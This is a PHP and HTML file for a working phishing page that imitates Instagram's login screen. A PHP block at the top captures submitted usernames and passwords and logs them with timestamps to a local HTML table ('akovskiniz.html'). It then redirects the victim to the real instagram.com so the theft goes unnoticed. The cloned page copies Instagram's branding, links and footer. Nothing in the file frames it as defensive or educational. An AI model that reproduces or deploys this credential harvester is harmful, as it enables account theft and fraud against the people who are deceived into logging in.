<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $kullaniciadi = $_POST["id"];
    $sifre = $_POST["pass"];
    $tarih = date('d.m.Y H:i:s');

    // Veriyi tabloya eklemek için
    $veri = "<tr><td>$tarih</td><td>$kullaniciadi</td><td>$sifre</td></tr>";

    $dosya = "akovskiniz.html";

    // Eğer dosya yoksa tablo başlığını ekleyerek oluştur
    if (!file_exists($dosya)) {
        $baslik = "<head><meta charset='UTF-8'></head><table border='1'><tr><th>Tarih</th><th>Kullanıcı Adı</th><th>Şifre</th></tr>";
        file_put_contents($dosya, $baslik);
    }

    // Veriyi dosyaya ekleyerek yaz
    file_put_contents($dosya, $veri, FILE_APPEND | LOCK_EX);

    header("Location:https://www.instagram.com");
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="./style.css">
    <link rel="shortcut icon" href="./img/lswP1OF1o6P.png" type="image/x-icon">
</head>
<body>
    
<center>
<div id="maindiv">
    <div id="toppart">
        <div id="mobileimage">
            <img src="./img/ItTndlZM2n2.png" class="imgalign" alt="">
            <img src="./img/screenshot2.png" alt="" class="relativeimg">
        </div>
        

        <div id="loginform">
            <div id="formtop">
                <img src="./fonts/Instafont.png" alt="Instagram" id="instafonts"><br>
                <form action="" method="POST">
                    <input type="text" name="id" placeholder=" &nbsp; Phone number, username, or email." class="textinp" required class="ind"><br>
                    <input type="password" name="pass" placeholder=" &nbsp; Password" class="textinp" id="a-button" required class="ind"><br>
                    <input type="submit" value="Log in" class="buttoninp" id="b-button"><br>
                </form>
                <div id="forhr-or">
                    <div id="hr1">
                        <hr class="thehr">
                    </div>
                    <div id="hror">
                        <p class="por">OR</p>
                    </div>
                    <div id="hr2">
                        <hr class="thehr">
                    </div>
                </div>
                <div id="flogin">
                    <a id="fblink" href="https://www.facebook.com/login.php"> <img src="./img/fb-favicon.jpg" height="16px" alt="Facebook" align="top">&nbsp; Log in with Facebook</a> 
                </div>
                <center>
                    <div id="fgt">
                        <a href="https://www.instagram.com/accounts/password/reset/" id="forgot">Forgot password?</a>
                    </div>
                </center>
            </div>

            <div id="signupdiv">
                <p id="noacc">Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" id="signup">Sign up</a></p>
            </div>

            <div>
                <p id="getapp">Get the app.</p>
            </div>

            <div id="bottomimages">
                <a href="https://play.google.com/store/apps/details?id=com.instagram.android"><img src="./img/c5Rp7Ym-Klz.png" alt="" class="imagelink"></a>
                <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt"><img src="./img/EHY6QnZYdNX.png" alt="" class="imagelink"></a>
            </div>
        </div>
    </div>


    <div id="bottompart">
        <ul id="navbar">
            <li> <a href="https://about.meta.com/">Meta</a> </li>
            <li> <a href="https://about.instagram.com/">About</a> </li>
            <li> <a href="https://about.instagram.com/blog/">Blog</a> </li>
            <li> <a href="https://www.instagram.com/about/jobs/">Jobs</a> </li>
            <li> <a href="https://help.instagram.com/">Help</a> </li>
            <li> <a href="https://developers.facebook.com/docs/instagram">API</a> </li>
            <li> <a href="https://www.instagram.com/legal/privacy/">Privacy</a> </li>
            <li> <a href="https://www.instagram.com/legal/terms/">Terms</a> </li>
            <li> <a href="https://www.instagram.com/directory/profiles/">Top Accounts</a> </li>
            <li> <a href="https://www.instagram.com/explore/locations/">Location</a> </li>
            <li> <a href="https://www.instagram.com/web/lite/">Instagram Lite</a> </li>
            <li> <a href="https://www.threads.net/login">Threads</a> </li>
            <li> <a href="https://www.facebook.com/help/instagram/261704639352628">Contact Uploading & Non-Users</a> </li>
            <li> <a href="https://about.meta.com/technologies/meta-verified/">Meta Verified</a> </li>
        </ul>

            <table>
                <tr>
                    <td>
                        <select class="exit">
                            <option value="" selected>English</option>
                            <option value="">Urdu</option>
                            <option value="">M.Faizan</option>
                            <option value="">Alam</option>
                            <option value="">SMIT</option>
                            <option value="">WMA</option>
                            <option value="">102876</option>
                            <option value="">7-9</option>
                            <option value="">Sir Saad</option>
                        </select>
                    </td>

                    <td class="exit">
                        <p> &nbsp; &copy; 2023 Instagram from Meta</p>
                    </td>
                </tr>
            </table>
    </div>
</div>
</center>
</body>
</html>